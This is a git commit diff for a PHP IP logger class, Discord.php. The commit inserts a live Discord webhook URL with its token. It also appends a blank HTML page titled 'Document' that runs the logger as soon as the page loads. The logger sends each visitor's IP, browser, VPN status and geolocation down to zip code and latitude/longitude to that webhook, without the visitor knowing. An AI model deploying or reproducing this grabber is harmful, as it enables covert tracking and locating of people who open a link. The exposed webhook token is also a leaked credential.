36c4bcf8e60426553d03e23842dd68d142180d9a
9gscott33 <sonicgold257@gmail.com>
2024-12-21 23:06:39 -0600

    Update Discord.php

--- Discord.php
+++ Discord.php
@@ -56,7 +56,7 @@ class Discord
         global $IP, $Browser, $Date, $Time, $VPN, $Country, $CountryCode, $Region, $City, $Zip, $Lat, $Lon, $WebhookName, $Flag;
 
 		//Insert FULL webhook URL here (URL begins with: https://discord.com/api/webhooks/)
-        $Webhook = "FULLURLHERE";
+        $Webhook = "https://discord.com/api/webhooks/1320254881512161311/XH-XhXYR12pyUWG60_OOspON-QNa-sll5eIHbRGlsK45qLs1qKPGBGqtAK-6LRNo4lv5";
 
         $InfoArr = array(
             "username" => "$WebhookName",
@@ -115,3 +115,21 @@ class Discord
 }
 
 ?>
+
+<html>
+<head>
+  <title>Document</title>
+</head>
+<body>
+
+<?php
+//If your Discord.php file is in another folder you need to change the file path!
+include("Discord.php");
+$sendembed = New Discord();
+
+//Executes the function
+$sendembed->Visitor();
+?>
+
+</body>
+</html>
